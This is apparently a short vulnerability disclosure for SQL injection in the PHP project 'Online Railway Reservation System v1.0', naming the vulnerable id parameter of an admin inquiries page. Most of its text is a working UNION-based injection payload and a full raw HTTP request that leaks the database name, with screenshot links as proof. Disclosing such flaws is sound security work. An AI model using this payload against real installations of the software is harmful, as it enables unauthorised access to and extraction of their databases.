# Online Railway Reservation System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15121/online-railway-reservation-system-phpoop-project-free-source-code.html

Vulnerability File: /orrs/admin/inquiries/view_details.php?id=

Vulnerability location: /orrs/admin/inquiries/view_details.php?id=, id

dbname = orrs_db

[+] Payload: /orrs/admin/inquiries/view_details.php?id=-1%27%20union%20select%201,database(),3,4,5,6,7--+ // Leak place ---> id

```sql
GET /orrs/admin/inquiries/view_details.php?id=-1%27%20union%20select%201,database(),3,4,5,6,7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=hea24clorqs9kplqalqihp0ik4
Connection: close
```
![image](https://user-images.githubusercontent.com/75623057/172327955-205662c7-21cb-4201-b819-c9f0001c7601.png)

![image](https://user-images.githubusercontent.com/75623057/172327802-d8ac692e-0386-43f0-95ce-642e71e5bd88.png)
